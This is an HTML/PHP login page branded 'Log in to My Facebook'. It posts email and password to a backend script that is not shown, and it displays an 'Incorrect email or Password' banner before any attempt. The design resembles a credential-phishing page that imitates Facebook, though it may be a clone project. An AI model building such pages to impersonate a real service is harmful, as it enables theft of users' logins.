<!DOCTYPE html>
<html>
<head>
<title>Log in to My Facebook</title>
<!--facebook background-->
<?php
include("fb_back.php");
?>
<!--css for button and text field-->
<link href="style.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="styler.js"> </script>


</head>

<body>
<!--middle white form-->
<div style="position:absolute;left:26.7%; top:27%; height:52%; width:45%; background:#ffffff ">   </div>
<div id="ab" style="position:absolute;left:42.2%;top:22.9%;font-weight:bold;font-size:120%;color:#000000;">Log in to My Facebook</div>
<div id="aeq" style="display:none; position:absolute;left:42.2%;top:31.9%;font-weight:bold;font-size:120%;color:#000000;">Log in to My Facebook</div>
<div id="err" style="position:absolute;left:34.7%; top:29.9%; height:7%; width:29.1%; background:#CE4123 "> </div>
<div id="er" style="position:absolute;left:39.9%;top:31%;font-weight:bold;font-size:120%;color:#000000;">Incorrect email or Password.</div>
<!--the middle signin form-->
<form method="post" action="bklogin.php">

<div style="position:absolute; left:34.5%;top:40.3%"><input onclick="keyupFunction()" style="width:190%" type="text" class="homeinput" name="uname"  placeholder="Email Address" maxlength="20"/></div>
<div style="position:absolute; left:34.5%;top:47.3%"><input style="width:190%" type="password" class="homeinput" name="password"  placeholder="Enter Password" maxlength="20"/></div>
<div style="position:absolute; left:34.4%;top:56.5%"><input style="width:365%" type="submit" class="login" name="login" value="Log In"></div>
<div style="position:absolute; left:41.8%;top:66.3%"><a href="in_signup.php">Sign up for My Facebook</a><div>

</form>

</body>
</html>